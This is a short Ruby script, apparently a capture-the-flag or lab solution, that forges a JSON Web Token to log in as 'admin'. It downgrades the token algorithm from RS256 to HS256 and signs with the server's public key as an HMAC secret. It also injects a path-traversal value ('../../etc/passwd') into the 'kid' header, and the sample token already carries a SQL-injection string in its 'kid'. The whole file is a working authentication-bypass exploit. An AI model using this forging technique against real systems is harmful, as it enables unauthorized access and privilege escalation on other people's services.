require 'base64'
require 'openssl'

pub =File.open("public.pem").read

token="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEgb3IgIjEiPSIxIn0=.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"

header,payload,sig=token.split('.')

dec_head =Base64.decode64(header)
dec_head.gsub!("RS256", "HS256")
one , tow = dec_head.split('"}')
one = one .concat(' ,"kid":"../../../../././etc/passwd"} ')
dec_head = one
puts dec_head
new_head = Base64.strict_encode64(dec_head).gsub("=","")

dec_pay =Base64.decode64(payload)
dec_pay.gsub!("test", "admin")
puts dec_pay
new_pay = Base64.strict_encode64(dec_pay).gsub("=", "")


data =new_head+"."+new_pay

  

sig =Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"),pub,data))

puts data+"."+sig




